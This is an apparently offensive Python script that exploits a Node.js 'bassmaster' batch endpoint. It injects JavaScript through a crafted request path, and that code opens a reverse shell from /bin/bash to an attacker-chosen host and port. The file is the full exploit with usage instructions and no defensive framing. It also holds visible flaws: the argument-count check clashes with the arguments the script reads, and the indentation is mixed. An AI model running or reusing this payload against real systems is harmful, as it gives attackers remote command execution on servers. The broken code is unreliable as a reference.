import sys, requests

def delivery(ip, lhost, lport):
	target = "http://%s/batch" % ip
	s = requests.Session()

	cmd = "\\\\x2fbin\\\\x2fbash"
	payload = "var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\');" % cmd
	payload += "var client = new net.Socket();"
	payload += "client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);" % (lport, lhost)
	payload += "sh.stderr.pipe(client);});"

	req = '{"requests":[{"method":"get","path":"/profile"},{"method":"get","path":"/item"},{"method":"get","path":"/item/$1.id;%s"}]}' % payload

	s.post(target, req)

def main():
	if len(sys.argv) != 3:
		print("[!] Usage: python3 %s <target:port/app_path> <lhost> <lport>" % sys.argv[0])
		print("ex: python3 %s 192.168.1.100:8080/bassmaster 192.168.0.1 4444\n" % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
  lhost = sys.argv[2]
	lport = sys.argv[3]
	delivery(ip, lhost, lport)

if __name__ == "__main__":
	main()
